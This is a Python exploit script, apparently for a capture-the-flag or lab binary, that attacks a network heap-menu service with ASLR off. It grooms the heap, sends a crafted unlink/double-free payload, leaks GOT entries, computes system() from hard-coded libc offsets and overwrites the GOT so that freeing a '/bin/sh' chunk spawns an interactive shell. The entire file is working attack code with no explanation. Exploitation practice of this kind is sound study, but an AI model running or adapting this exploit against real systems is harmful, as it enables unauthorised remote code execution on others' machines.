#! /usr/bin/python
#coding:utf-8
'''Heap_DoubleFree - Ret2libc_MemLeak (ALSR - off)'''

import socket
import struct
import sys
sys.path.append("..")
import payloads
from payloads import *
from zio import *

class exploit(object):
    'exploit5'
    def __init__(self, options):
        self.options = options
        self.info = {
            'libc_free':0x0007a2c0,
            'libc_sys':0x0003f490,
            'ptr':0x0804bfa0,
            'got':0x0804a004
            }
    def test(self):
        ip, port = self.options['dIP'], int(self.options['dPort'])
        io = zio((ip, port))


        io.readline()
        io.writeline('m')
        io.readline()
        io.readline()
        io.writeline('504')
        io.readline()
        io.writeline('aaa')
        io.readline()

        io.readline()
        io.writeline('m')
        io.readline()
        io.readline()
        io.writeline('512')
        io.readline()
        io.writeline('aaa')
        io.readline()

        io.readline()
        io.writeline('f')
        io.readline()
        io.writeline('0')
        io.readline()

        io.readline()
        io.writeline('f')
        io.readline()
        io.writeline('1')
        io.readline()

        #关键payload
        io.readline()
        io.writeline('m')
        io.readline()
        io.readline()
        io.writeline('768')
        io.readline()
        io.writeline(l32(0x0)  + l32(0x1f9) + l32(self.info['ptr'] - 0xc) + l32(self.info['ptr'] - 0x8) + 'a'*(0x200-24) + l32(0x1f8) + l32(0x108))
        io.readline()


        io.readline()
        io.writeline('m')
        io.readline()
        io.readline()
        io.writeline('20')
        io.readline()
        io.writeline('/bin/sh')
        io.readline()

        io.readline()
        io.writeline('f')
        io.readline()
        io.writeline('1')
        io.readline()


        io.readline()
        io.writeline('e')
        io.readline()
        io.writeline('0')
        io.writeline('a'*12 + l32(self.info['got']))
        io.readline()

    # leak GOT
        io.readline()
        io.writeline('p')
        io.readline()
        io.writeline('0')

        # free_addr = l32(io.read(4))
        # getchar = l32(io.read(4))
        # stack_chk_fail = l32(io.read(4))
        # malloc = l32(io.read(4))
        # puts = l32(io.read(4))
        # gmon_start__  = l32(io.read(4))
        # libc_start_main = l32(io.read(4))
        # isoc99_scanf = l32(io.read(4))

        gets = l32(io.read(4))
        free_addr = l32(io.read(4))
        getchar = l32(io.read(4))
        malloc = l32(io.read(4))
        puts = l32(io.read(4))
        gmon_start__  = l32(io.read(4))
        libc_start_main = l32(io.read(4))
        isoc99_scanf = l32(io.read(4))


        io.readline()
        io.readline()

        sys_addr = free_addr - self.info['libc_free'] + self.info['libc_sys']

        io.writeline('e')
        io.readline()
        io.readline()
        io.writeline('0')
    # overwrite GOT
        # io.writeline(l32(sys_addr) + l32(getchar) + l32(stack_chk_fail) + l32(malloc) + l32(puts) + l32(gmon_start__) + l32(libc_start_main) + l32(isoc99_scanf))
        io.writeline(l32(gets) + l32(sys_addr) + l32(getchar) + l32(malloc) + l32(puts) + l32(gmon_start__) + l32(libc_start_main) + l32(isoc99_scanf))
        io.readline()
        io.readline()

        io.writeline('f')
        io.readline()
        io.writeline('3')

        print 'system_addr = ' + hex(sys_addr)

        io.interact()

                



if __name__=='__main__':
    pass



